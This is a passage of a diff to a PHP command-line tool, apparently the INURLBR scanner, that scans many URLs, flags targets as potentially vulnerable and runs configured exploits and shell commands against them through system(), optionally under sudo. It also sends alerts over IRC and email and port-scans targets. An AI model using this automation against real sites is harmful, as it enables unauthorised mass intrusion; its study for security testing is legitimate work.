+        (not_isnull_empty($_SESSION['config']['exploit-vul-id']) ?
+                        __configExploitsExec($_SESSION['config']['exploit-vul-id'], $target_) : NULL);
+        __plus();
     }
+
+    (not_isnull_empty($_SESSION['config']['exploit-all-id']) ? __configExploitsExec($_SESSION['config']['exploit-all-id'], $target_) : NULL);
+    __plus();
+
+    (not_isnull_empty($_SESSION['config']['command-all']) ? __command($_SESSION['config']['command-all'], $target_) : NULL);
+    __plus();
 
     $_SESSION['config']['cont_valores'] ++;
 
@@ -1092,6 +1663,7 @@ function __checkURLs($resultado, $url_) {
 
 ################################################################################
 #This function will send the contents of the output buffer (if any)#############
+################################################################################
 
 function __plus() {
 
@@ -1101,14 +1673,17 @@ function __plus() {
 
 ################################################################################
 #FORMATTING POST################################################################
+################################################################################
 
 function __convertUrlQuery($query) {
 
     $queryParts = explode('&', $query);
     $params = array();
+    $match = array();
     foreach ($queryParts as $param) {
-        $item = explode('=', $param) . __plus();
-        $params[$item[0]] = urlencode($item[1]);
+        $item = explode('=', $param);
+        preg_match_all("([a-zA-Z0-9]=(.*))", $param, $match);
+        $params[$item[0]] = ($match[1][0]);
     }
 
     return $params;
@@ -1116,6 +1691,7 @@ function __convertUrlQuery($query) {
 
 ################################################################################
 #OPEN FILE BASE FOR VALIDATION##################################################
+################################################################################
 
 function __openFile($arquivo, $op = NULL) {
 
@@ -1131,6 +1707,7 @@ function __openFile($arquivo, $op = NULL) {
 
 ################################################################################
 #CATCH INFORMATION IP###########################################################
+################################################################################
 
 function __infoIP($ip, $op = 0) {
 
@@ -1153,12 +1730,12 @@ function __infoIP($ip, $op = 0) {
     preg_match_all('#\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})#si', $ip, $ip);
     if (filter_var($ip[0][0], FILTER_VALIDATE_IP)) {
         if ($op == 0) {
-            $request__ = __request_info($curl = curl_init(), "http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
+            $request__ = __request_info("http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
             __plus();
             return json_decode($request__['corpo'], TRUE);
         } else {
             $_SESSION['config']['verifica_info'] = NULL;
-            $request__ = __request_info($curl = curl_init(), "http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
+            $request__ = __request_info("http://www.telize.com/geoip/{$ip[0][0]}", $_SESSION["config"]["proxy"], NULL);
             $return = json_decode($request__['corpo'], TRUE);
             __plus();
             return "{$return['city']} /{$return['country']} - {$return['country_code']} /{$return['continent_code']} , ISP: {$return['isp']}";
@@ -1168,6 +1745,7 @@ function __infoIP($ip, $op = 0) {
 
 ################################################################################
 #CAPTURE URL POSITION IN BROWSER ALEXA / RELEVANCE OF SUCH URL##################
+################################################################################
 
 function __positionAlexa($url) {
 
@@ -1184,6 +1762,7 @@ function __positionAlexa($url) {
 
 ################################################################################
 #GENERATE URL REFERENCE random##################################################
+################################################################################
 
 function __setURLReferenceRandom() {
 
@@ -1227,6 +1806,7 @@ function __setURLReferenceRandom() {
 
 ################################################################################
 #GENERATE AGENT BROWSER random##################################################
+################################################################################
 
 function __setUserAgentRandom() {
 
@@ -1268,8 +1848,10 @@ function __setUserAgentRandom() {
 
 ################################################################################
 #RESPONSIBLE FOR RUN COMMANDS IN TERMINAL the installation of facilities########
+################################################################################
 
 function __installDepencia() {
+
     echo __bannerlogo() . __plus();
     echo "\n{$_SESSION["c15"]}|_[ * ]__{$_SESSION["c0"]}\n";
     echo "         {$_SESSION["c15"]}|[EXTERNAL COMMAND INSTALLING PREMISES ]:: {$_SESSION["c11"]}\n";
@@ -1277,6 +1859,7 @@ function __installDepencia() {
     sleep(1) . __plus();
     echo "{$_SESSION["c0"]}";
     if (empty($dados)) {
+
         return FALSE;
     }
     unset($dados);
@@ -1285,33 +1868,58 @@ function __installDepencia() {
 
 ################################################################################
 #RESPONSIBLE FOR RUN COMMANDS IN TERMINAL#######################################
+################################################################################
 
 function __command($commando, $alvo) {
 
     if (!is_null($commando)) {
 
-        (strstr($commando, '_TARGET_') || strstr($commando, '_TARGETFULL_') || strstr($commando, '_TARGETIP_') || strstr($commando, '_EXPLOIT_') ? NULL : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c2"]}SET PARAMETER - command correctly{$_SESSION["c0"]}\n"));
+        (strstr($commando, '_TARGET_') ||
+                strstr($commando, '_TARGETFULL_') ||
+                strstr($commando, '_TARGETIP_') ||
+                strstr($commando, '_EXPLOIT_') ||
+                strstr($commando, '_URI_') ||
+                strstr($commando, '_URI_') ||
+                strstr($commando, '_PORT_') ||
+                strstr($commando, '_RANDOM_') ? NULL :
+                        __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c2"]}SET PARAMETER - command correctly{$_SESSION["c0"]}\n"));
 
-        $commandoCor = str_replace("_TARGET_", "{$_SESSION["c8"]}" . __filterHostname($alvo) . "{$_SESSION["c15"]}", $commando);
-        $commandoCor = str_replace('_TARGETIP_', "{$_SESSION["c9"]}{$_SESSION['config']['server_ip']}{$_SESSION["c15"]}", $commandoCor);
-        $commandoCor = str_replace('_TARGETFULL_', "{$_SESSION["c14"]}{$alvo}{$_SESSION["c15"]}", $commandoCor);
-        $commandoCor = str_replace("_EXPLOIT_", "{$_SESSION["c6"]}{$_SESSION['config']['exploit-command']}{$_SESSION["c15"]}", $commandoCor);
+        $uri = parse_url($alvo['url_xpl']);
 
-        $commando = str_replace("_TARGET_", __filterHostname($alvo), $commando);
-        $commando = str_replace('_TARGETIP_', $_SESSION['config']['server_ip'], $commando);
-        $commando = str_replace('_TARGETFULL_', $alvo, $commando);
-        $commando = str_replace("_EXPLOIT_", $_SESSION['config']['exploit-command'], $commando);
-        $commando = str_replace("\n", '', str_replace("\r", '', $commando));
+        $command[0] = str_replace("_TARGET_", "{$_SESSION["c8"]}" . __filterHostname($alvo['url_xpl']) . "{$_SESSION["c1"]}", $commando);
+        $command[0] = str_replace('_TARGETIP_', "{$_SESSION["c9"]}{$_SESSION['config']['server_ip']}{$_SESSION["c1"]}", $command[0]);
+        $command[0] = str_replace('_TARGETFULL_', "{$_SESSION["c14"]}{$alvo['url_clean']}{$_SESSION["c1"]}", $command[0]);
+        $command[0] = str_replace('_TARGETXPL_', "{$_SESSION["c14"]}{$alvo['url_xpl']}{$_SESSION["c1"]}", $command[0]);
+        $command[0] = str_replace("_EXPLOIT_", "{$_SESSION["c6"]}{$_SESSION['config']['exploit-command']}{$_SESSION["c1"]}", $command[0]);
+        $command[0] = str_replace('_URI_', "{$_SESSION["c8"]}{$uri['path']}{$_SESSION["c1"]}", $command[0]);
+        $command[0] = str_replace('_PORT_', "{$_SESSION["c9"]}{$alvo['url_port']}{$_SESSION["c1"]}", $command[0]);
+        $command[0] = str_replace('_RANDOM_', "{$_SESSION["c15"]}" . random(5) . "{$_SESSION["c1"]}", $command[0]);
 
-        echo "\n{$_SESSION["c1"]}|_[ * ]__{$_SESSION["c0"]}\n";
-        echo "         {$_SESSION["c1"]}|[ EXTERNAL COMMAND ]:: {$commandoCor}{$_SESSION["c11"]}\n";
+        $command[0] = __crypt($command[0]);
 
-        $dados = system($commando, $dados);
+        $command[1] = str_replace("_TARGET_", __filterHostname($alvo['url_clean']), $commando);
+        $command[1] = str_replace('_TARGETIP_', $_SESSION['config']['server_ip'], $command[1]);
+        $command[1] = str_replace('_TARGETFULL_', $alvo['url_clean'], $command[1]);
+        $command[1] = str_replace('_TARGETXPL_', $alvo['url_xpl'], $command[1]);
+        $command[1] = str_replace("_EXPLOIT_", $_SESSION['config']['exploit-command'], $command[1]);
+        $command[1] = str_replace("_URI_", $uri['path'], $command[1]);
+        $command[1] = str_replace("_PORT_", $alvo['url_port'], $command[1]);
+        $command[1] = str_replace("_RANDOM_", random(5), $command[1]);
+        $command[1] = str_replace("\n", '', str_replace("\r", '', $command[1]));
+
+        $command[1] = __crypt($command[1]);
+
+        echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
+        echo "         |[ EXTERNAL COMMAND ]:: {$command[0]}{$_SESSION["c11"]}\n";
+        $_ = array(0 => ($_SESSION['config']['popup']) ? 'sudo xterm -geometry 134x50+1900+0 -title "Auxiliary Window - INURLBR / COMMAND" -e ' : NULL, 1 => ($_SESSION['config']['popup']) ? ' > /dev/null &' : NULL);
+        echo ($_SESSION['config']['popup'] ? "\t[!] opening auxiliary window...\n" : NULL);
+        $dados = system($_[0] . $command[1] . $_[1], $dados);
         sleep(1) . __plus();
 
-        echo "{$_SESSION["c0"]}";
+        echo $_SESSION["c0"];
     }
     if (empty($dados[0])) {
+
         return FALSE;
     }
     unset($dados);
@@ -1319,96 +1927,170 @@ function __command($commando, $alvo) {
 
 ################################################################################
 #FILTER BY TAKING ONLY RESPONSIBLE URL HOSTNAME#################################
+################################################################################
 
 function __filterHostname($url) {
 
     $alvo_ = NULL;
-    preg_match_all("#\b((((ht|f)tps?://*)|(www|ftp)\.)[a-zA-Z0-9-\.]+)#i", $url, $alvo_);
+    //#\b((((ht|f)tps?://*)|(www|ftp)\.)[a-zA-Z0-9-\.]+)#i - 1.0
+    preg_match_all('@^(?:(ht|f)tps?://*)?([^/]+)@i', $url, $alvo_);
     return str_replace("/", '', str_replace("ftps:", '', str_replace("ftp:", '', str_replace("https:", '', str_replace("http:", '', $alvo_[0][0])))));
 }
 
 ################################################################################
 #RESPONSIBLE FOR ALL REQUESTS GET / POST THE SCRIPT#############################
+################################################################################
+/*
+  curl_multi_init — Returns a new cURL multi handle
+  (PHP 5) http://php.net/manual/en/function.curl-multi-init.php
+ */
 
-function __request_info($curl, $url_, $proxy = NULL, $postDados = NULL) {
+function __request_info($url_, $proxy = NULL, $postDados = NULL) {
 
-    __plus();
-    //FORMATANDO POST & EXECUTANDO urlencode EM CADA VALOR DO POST.
-    if (isset($postDados) && !empty($postDados) && is_array($postDados)) {
+    $url_ = __crypt($url_);
+    $mh = curl_multi_init();
+    $curl_array = array();
+    $nodes = is_array($url_) ? $url_ : array($url_);
 
-        foreach ($postDados as $campo => $valor) {
-            $postDados_format .= $campo . '=' . urlencode($valor) . '&';
+    foreach ($nodes as $i => $url) {
+
+        $curl_array[$i] = curl_init($url);
+
+        __plus();
+
+        //FORMATANDO POST & EXECUTANDO urlencode EM CADA VALOR DO POST.
+        if (not_isnull_empty($postDados) && is_array($postDados)) {
+
+            foreach ($postDados as $campo => $valor) {
+
+                $postDados_format .= "{$campo}=" . urlencode($valor) . '&';
+            }
+
+            $postDados_format = rtrim($postDados_format, '&');
+            curl_setopt($curl_array[$i], CURLOPT_POST, count($postDados));
+            curl_setopt($curl_array[$i], CURLOPT_POSTFIELDS, __crypt($postDados_format));
         }
-        $postDados_format = rtrim($postDados_format, '&');
-        curl_setopt($curl, CURLOPT_POST, count($postDados));
-        curl_setopt($curl, CURLOPT_POSTFIELDS, $postDados_format);
+
+        curl_setopt($curl_array[$i], CURLOPT_HTTPHEADER, array_merge(not_isnull_empty($_SESSION['config']['http-header']) ?
+                                explode(',', __crypt($_SESSION['config']['http-header'])) : array(), array("Cookie: disclaimer_accepted=true")));
+        curl_setopt($curl_array[$i], CURLOPT_USERAGENT, (not_isnull_empty($_SESSION['config']['user-agent'])) ?
+                        __crypt($_SESSION['config']['user-agent']) : __setUserAgentRandom());
+        curl_setopt($curl_array[$i], CURLOPT_REFERER, (not_isnull_empty($_SESSION['config']['url-reference'])) ?
+                        __crypt($_SESSION['config']['url-reference']) : __setURLReferenceRandom());
+
+        (!is_null($proxy) ? curl_setopt($curl_array[$i], CURLOPT_PROXY, $proxy) : NULL);
+        (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl_array[$i], CURLOPT_HEADER, 1) : NULL;
+        (!is_null($_SESSION['config']['verifica_info']) && __validateOptions('3,6', $_SESSION['config']['debug']) ?
+                        curl_setopt($curl_array[$i], CURLOPT_VERBOSE, 1) : NULL);
+
+        __plus();
+        curl_setopt($curl_array[$i], CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($curl_array[$i], CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($curl_array[$i], CURLOPT_FRESH_CONNECT, 1);
+        curl_setopt($curl_array[$i], CURLOPT_RETURNTRANSFER, 1);
+
+        curl_setopt($curl_array[$i], CURLOPT_CONNECTTIMEOUT, not_isnull_empty($_SESSION['config']['time-out']) ?
+                        $_SESSION['config']['time-out'] : 5);
+
+        curl_setopt($curl_array[$i], CURLOPT_TIMEOUT, not_isnull_empty($_SESSION['config']['time-out']) ?
+                        $_SESSION['config']['time-out'] : 5);
+
+        curl_setopt($curl_array[$i], CURLOPT_COOKIEFILE, not_isnull_empty($_SESSION['config']['file-cookie']) ?
+                        $_SESSION['config']['file-cookie'] : 'cookie.txt');
+
+        curl_setopt($curl_array[$i], CURLOPT_COOKIEJAR, not_isnull_empty($_SESSION['config']['file-cookie']) ?
+                        $_SESSION['config']['file-cookie'] : 'cookie.txt');
+
+        curl_multi_add_handle($mh, $curl_array[$i]);
     }
-    curl_setopt($curl, CURLOPT_URL, $url_);
-    curl_setopt($curl, CURLOPT_HTTPHEADER, array_merge(not_isnull_empty($_SESSION['config']['http-header']) ? explode(',', $_SESSION['config']['http-header']) : array(), array("Cookie: disclaimer_accepted=true")));
-    curl_setopt($curl, CURLOPT_USERAGENT, (not_isnull_empty($_SESSION['config']['user-agent'])) ? $_SESSION['config']['user-agent'] : __setUserAgentRandom());
-    curl_setopt($curl, CURLOPT_REFERER, (not_isnull_empty($_SESSION['config']['url-reference'])) ? $_SESSION['config']['url-reference'] : __setURLReferenceRandom());
+    $running = NULL;
+    do {
 
-    (!is_null($proxy) ? curl_setopt($curl, CURLOPT_PROXY, $proxy) : NULL);
-    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_HEADER, 1) : NULL;
-    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_FRESH_CONNECT, 1) : NULL;
-    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_RETURNTRANSFER, 0) : NULL;
-    (!is_null($_SESSION['config']['verifica_info']) && __validateOptions('3,6', $_SESSION['config']['debug']) ? curl_setopt($curl, CURLOPT_VERBOSE, 1) : NULL);
-    __plus();
-    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
-    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
-    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, not_isnull_empty($_SESSION['config']['time-out']) ? $_SESSION['config']['time-out'] : 20);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookie.txt');
-    curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookie.txt');
+        usleep(100);
+        curl_multi_exec($mh, $running);
+    } while ($running > 0);
+    $ret = array();
+    foreach ($nodes as $i => $url) {
 
-    $corpo = curl_exec($curl);
-    __plus();
-    $server = curl_getinfo($curl);
-    __plus();
+        $ret[0] = curl_multi_getcontent($curl_array[$i]);
+        $ret[1] = curl_getinfo($curl_array[$i]);
+        $ret[2] = curl_error($curl_array[$i]);
+    }
+    foreach ($nodes as $i => $url) {
+        curl_multi_remove_handle($mh, $curl_array[$i]);
+    }
+
     $status = NULL;
-    preg_match_all('(HTTP.*)', $corpo, $status['http']);
-    preg_match_all('(Server:.*)', $corpo, $status['server']);
-    preg_match_all('(X-Powered-By:.*)', $corpo, $status['X-Powered-By']);
+    preg_match_all('(HTTP.*)', $ret[0], $status['http']);
+    preg_match_all('(Server:.*)', $ret[0], $status['server']);
+    preg_match_all('(X-Powered-By:.*)', $ret[0], $status['X-Powered-By']);
 
-    $info = str_replace("\r", '', str_replace("\n", '', "{$status['http'][0][0]}, {$status['server'][0][0]}  {$status['X-Powered-By'][0][0]}"));
-    __debug(array('debug' => "[ BODY ]{$corpo}", 'function' => '__request_info'), 4) . __plus();
-    __debug(array('debug' => "[ URL ]{$url_}", 'function' => '__request_info'), 2) . __plus();
-    curl_close($curl) . __plus();
-    unlink('cookie.txt');
-    unset($curl);
-    return isset($corpo) ? array('corpo' => $corpo, 'server' => $server, 'info' => $info) : FALSE;
+    __plus();
+    $ret[3] = str_replace("\r", '', str_replace("\n", '', "{$status['http'][0][0]}, {$status['server'][0][0]}  {$status['X-Powered-By'][0][0]}"));
+    __debug(array('debug' => "[ BODY ]{$ret[0]}", 'function' => '__request_info'), 4);
+
+    __plus();
+    __debug(array('debug' => "[ URL ]{$url_}", 'function' => '__request_info'), 2);
+
+    __plus();
+    curl_multi_close($mh) . unlink('cookie.txt');
+
+    __plus();
+    unset($curl_array);
+    return isset($ret[0]) ? array('corpo' => $ret[0], 'server' => $ret[1], 'error' => $ret[2], 'info' => $ret[3]) : FALSE;
 }
 
 ################################################################################
 #CAPTURE INFORMATION SERVER AND VALIDATE FAULTS#################################
+################################################################################
 
 function __infoServer($url_, $postDados = NULL) {
 
     __plus();
     $_SESSION['config']['verifica_info'] = 1;
-    $resultado = __request_info($curl = curl_init(), $url_, $_SESSION["config"]["proxy"], $postDados);
+    $resultado = __request_info($url_, $_SESSION["config"]["proxy"], $postDados);
     __plus();
     if (isset($resultado['corpo'])) {
         if (!is_null($_SESSION['config']['extrai-email'])) {
+
             __plus();
             return __extractEmail($resultado['corpo'], $url_);
         }
+
         if (!is_null($_SESSION['config']['extrai-url'])) {
+
             __plus();
             return __extractURLs($resultado['corpo'], $url_);
         }
+
         if (not_isnull_empty($_SESSION['config']['regexp-filter'])) {
+
             __plus();
             return __extractRegCustom($resultado['corpo'], $url_);
         }
+
         if (not_isnull_empty($_SESSION['config']['target']) && $_SESSION['config']['tipoerro'] == 5) {
+
             __plus();
-            return __checkURLs($resultado['server']['http_code'], $url_);
+            return __checkURLs($resultado, $url_);
         }
 
-        $_SESSION['config']['erroReturn'] = __checkError($resultado['corpo']);
+        $ifcode = not_isnull_empty($_SESSION['config']['ifcode']) &&
+                strstr($resultado['server']['http_code'], $_SESSION['config']['ifcode']) ?
+                "CODE_HTTP_FOUND: {$_SESSION['config']['ifcode']} / " : NULL;
+
+
+        $ifredirect = not_isnull_empty($_SESSION['config']['ifredirect']) &&
+                (strstr($resultado['server']['redirect_url'], $_SESSION['config']['ifredirect'])) ?
+                'VALUE URL REDIRECT FOUND' : NULL;
+
+        $_SESSION['config']['erroReturn'] = $ifredirect . $ifcode . __checkError($resultado['corpo']);
+        __plus();
+        $_SESSION['config']['curl_getinfo'] = $resultado['server'];
+        $_SESSION['config']['error_conection'] = (not_isnull_empty($resultado['error']) ? $resultado['error'] : NULL);
         $_SESSION['config']['server_ip'] = (!is_null($resultado['server']['primary_ip']) ? $resultado['server']['primary_ip'] : NULL);
-        $_SESSION['config']['vull_style'] = (not_isnull_empty($_SESSION['config']['erroReturn'])) ? "{$_SESSION["c4"]}( TARGET POTENTIALLY VULNERABLE )  \033[42;30m" . __cli_beep() : NULL;
+        $_SESSION['config']['vull_style'] = (not_isnull_empty($_SESSION['config']['erroReturn'])) ?
+                "{$_SESSION["c4"]}( POTENTIALLY VULNERABLE ){$_SESSION["c0"]}  \033[1m \033[32m" . __cli_beep() : NULL;
         $_SESSION['config']['resultado_valores'].=(not_isnull_empty($_SESSION['config']['erroReturn'])) ? "{$url_}\n" : NULL;
         __plus();
         $url_ = ($_SESSION['config']['alexa-rank']) ? ", RANK ALEXA: " . __positionAlexa($url_) : NULL;
@@ -1425,6 +2107,7 @@ function __infoServer($url_, $postDados = NULL) {
 
 ################################################################################
 #ERROR MAIN PROCESS RESPONSIBLE FOR ALL VALIDATION OF MOTOR#####################
+################################################################################
 
 function __processUrlExec($url, $contUrl) {
 
@@ -1434,107 +2117,187 @@ function __processUrlExec($url, $contUrl) {
         return FALSE;
     }
 
+    $host = (!is_null($_SESSION['config']['replace'])) ?
+            __replace($_SESSION['config']['replace'], urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url))) :
+            urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url));
 
-    $host = (!is_null($_SESSION['config']['replace'])) ? __replace($_SESSION['config']['replace'], urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url))) : urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url));
-    $info_['url'] = __mountURLExploit(!is_null($_SESSION['config']['url']) ? $_SESSION['config']['url'] . $host : $host);
-    $info = __infoServer($info_['url'], $_SESSION['config']['exploit-post']);
-    $url_ = ($_SESSION['config']['tipoerro'] == 4) ? $_SESSION['config']['url'] . $host : urldecode($url);
+    $target_['url_xpl'] = __remove($_SESSION['config']['remove'], __mountURLExploit(!is_null($_SESSION['config']['url']) ? $_SESSION['config']['url'] . $host : $host));
+    $info = __infoServer($target_['url_xpl'], $_SESSION['config']['exploit-post']);
+    $target_['url_clean'] = ($_SESSION['config']['tipoerro'] == 4) ? $_SESSION['config']['url'] . $host : urldecode($url);
+
     __plus();
-    if ($_SESSION['config']['tipoerro'] != 5 && is_null($_SESSION['config']['extrai-email']) && is_null($_SESSION['config']['extrai-url']) && is_null($_SESSION['config']['regexp-filter'])) {
-        $exget = (not_isnull_empty($_SESSION['config']['exploit-get']) ? ' GET=> ' . $_SESSION['config']['exploit-get'] : NULL);
-        $expost = (not_isnull_empty($_SESSION['config']['exploit-post']) ? ' POST=> ' . $_SESSION['config']['exploit-post'] : NULL);
+
+    if ($_SESSION['config']['tipoerro'] != 5 && is_null($_SESSION['config']['extrai-email']) &&
+            is_null($_SESSION['config']['extrai-url']) && is_null($_SESSION['config']['regexp-filter'])) {
+
+        $ifredirect = strstr($_SESSION['config']['curl_getinfo']['redirect_url'], $_SESSION['config']['ifredirect']) ?
+                "{$_SESSION["c4"]}{$_SESSION['config']['curl_getinfo']['redirect_url']}" : NULL;
+        $exget = (not_isnull_empty($_SESSION['config']['exploit-get']) ? ' _/GET=> ' . $_SESSION['config']['exploit-get'] : NULL);
+        $expost = (not_isnull_empty($_SESSION['config']['exploit-post']) ? ' _/POST=> ' . $_SESSION['config']['exploit-post_str'] : NULL);
         $valid_return = (not_isnull_empty($_SESSION['config']['erroReturn'])) ? TRUE : FALSE;
         $info = ($valid_return) ? "{$_SESSION["c4"]}{$info}" : $info;
-        $info_ip = ($valid_return) ? "{$_SESSION["c4"]}{$_SESSION['config']['info_ip']}" : $_SESSION['config']['info_ip'];
+        $target_ip = ($valid_return) ? "{$_SESSION["c4"]}{$_SESSION['config']['info_ip']}" : $_SESSION['config']['info_ip'];
+
         $anime = ($valid_return) ? '[ ! ]' : '[ - ]';
         echo __plus() . "\n";
 
         echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
-        echo "{$_SESSION["c1"]}|_[ + ] [{$_SESSION["c1"]} {$contUrl} {$_SESSION["c1"]}]{$_SESSION["c9"]}-[" . date("H:i:s") . "]{$_SESSION["c1"]} {$anime} {$_SESSION["c0"]}\n";
-        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Target:: {$_SESSION["c1"]}[{$_SESSION["c9"]} {$_SESSION['config']['vull_style']}{$url_}{$_SESSION["c1"]} ]{$_SESSION["c0"]}\n";
+        echo "{$_SESSION["c1"]}|_[ + ] [{$_SESSION["c1"]} {$contUrl} / {$_SESSION['config']['total_url']} {$_SESSION["c1"]}]{$_SESSION["c9"]}-[" . date("H:i:s") . "]{$_SESSION["c1"]} {$anime} {$_SESSION["c0"]}\n";
+        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Target:: {$_SESSION["c1"]}[{$_SESSION["c9"]} {$_SESSION['config']['vull_style']}{$target_['url_clean']}{$_SESSION["c1"]} ]{$_SESSION["c0"]}\n";
         echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Exploit:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$exget}{$expost}{$_SESSION["c0"]}\n";
         echo (not_isnull_empty($_SESSION['config']['replace'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Replace:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['replace']}{$_SESSION["c0"]}\n") : NULL;
+        echo (not_isnull_empty($_SESSION['config']['remove'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Remove:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['remove']}{$_SESSION["c0"]}\n") : NULL;
         echo (isset($_SESSION['config']['cms-check-resultado'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}CMS check:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['cms-check-resultado']}{$_SESSION["c0"]}\n") : NULL;
         echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Information Server:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$info}{$_SESSION["c1"]}\n";
-        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}More details:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$info_ip}{$_SESSION["c1"]}\n";
+        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}More details:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$target_ip}{$_SESSION["c1"]}\n";
         echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Found:: {$_SESSION["c9"]}" . ($valid_return ? "{$_SESSION["c4"]}{$_SESSION['config']['erroReturn']}" : "UNIDENTIFIED") . "{$_SESSION["c0"]}";
-        ($valid_return ? __saveValue($_SESSION['config']['arquivo_output'], $info_['url'], 1) : NULL);
-        echo ($_SESSION['config']['sendmail'] ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}SEND MAIL:: {$_SESSION["c9"]}" . (($valid_return) ? "{$_SESSION["c4"]}" : NULL) . __sendMail($_SESSION['config']['sendmail'], $info_['url']) . "{$_SESSION["c0"]}" : NULL);
-        (not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? __saveValue($_SESSION['config']['arquivo_output_all'], $info_['url'], NULL) : NULL);
+        echo (not_isnull_empty($ifredirect) ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}URL REDIRECT:: {$_SESSION["c9"]}{$ifredirect}{$_SESSION["c0"]}" : NULL);
+        echo (not_isnull_empty($_SESSION['config']['error_conection']) ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}ERROR CONECTION:: {$_SESSION["c2"]}{$_SESSION['config']['error_conection']}{$_SESSION["c0"]}" : NULL);
+        ($valid_return ? __saveValue($_SESSION['config']['arquivo_output'], $target_['url_xpl'], 1) : NULL);
+        echo ($_SESSION['config']['sendmail'] ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}SEND MAIL:: {$_SESSION["c9"]}" . (($valid_return) ? "{$_SESSION["c4"]}" : NULL) . __sendMail($_SESSION['config']['sendmail'], $target_['url_xpl']) . "{$_SESSION["c0"]}" : NULL);
+        (not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? __saveValue($_SESSION['config']['arquivo_output_all'], $target_['url_xpl'], NULL) : NULL);
         __plus();
-        (not_isnull_empty($_SESSION['config']['sub-file']) && is_array($_SESSION['config']['sub-file']) ? __subExecExploits($url_, $_SESSION['config']['sub-file']) : NULL);
+
+        if ($valid_return) {
+
+            (not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ?
+                            __ircMsg($_SESSION['config']['irc'], "{$_SESSION['config']['erroReturn']}::: {$target_['url_xpl']}") : NULL);
+            __plus();
+
+            (not_isnull_empty($_SESSION['config']['command-vul']) ? __command($_SESSION['config']['command-vul'], $target_) : NULL);
+            __plus();
+
+            (not_isnull_empty($_SESSION['config']['exploit-vul-id']) ?
+                            __configExploitsExec($_SESSION['config']['exploit-vul-id'], $target_) : NULL);
+            __plus();
+        }
+
+        (not_isnull_empty($_SESSION['config']['command-all']) ? __command($_SESSION['config']['command-all'], $target_) : NULL);
         __plus();
-        ($valid_return && !is_null($_SESSION['config']['command-vul']) ? __command($_SESSION['config']['command-vul'], $info_['url']) : NULL);
-        (not_isnull_empty($_SESSION['config']['command-all']) ? __command($_SESSION['config']['command-all'], $info_['url']) : NULL);
+
+        (not_isnull_empty($_SESSION['config']['sub-file']) &&
+                is_array($_SESSION['config']['sub-file']) ? __subExecExploits($target_['url_xpl'], $_SESSION['config']['sub-file']) : NULL);
         __plus();
-        ($valid_return && !is_null($_SESSION['config']['exploit-vull-id']) ? __configExploitsExec($_SESSION['config']['exploit-vull-id'], $info_['url']) : NULL);
-        (not_isnull_empty($_SESSION['config']['exploit-all-id']) ? __configExploitsExec($_SESSION['config']['exploit-all-id'], $info_['url']) : NULL);
+
+        (not_isnull_empty($_SESSION['config']['exploit-all-id']) ? __configExploitsExec($_SESSION['config']['exploit-all-id'], $target_) : NULL);
         __plus();
+
+        ($_SESSION['config']['robots'] ? __getValuesRobots($host) : NULL);
+        __plus();
+
+        (not_isnull_empty($_SESSION['config']['port-scan']) ? __portScan(array(0 => $target_, 1 => $_SESSION['config']['port-scan'])) : NULL);
+        __plus();
+
         __timeSec('delay', "\n");
     }
 }
 
 ################################################################################
 #PRINT MESSAGE AND OUT OF THE PROCESS###########################################
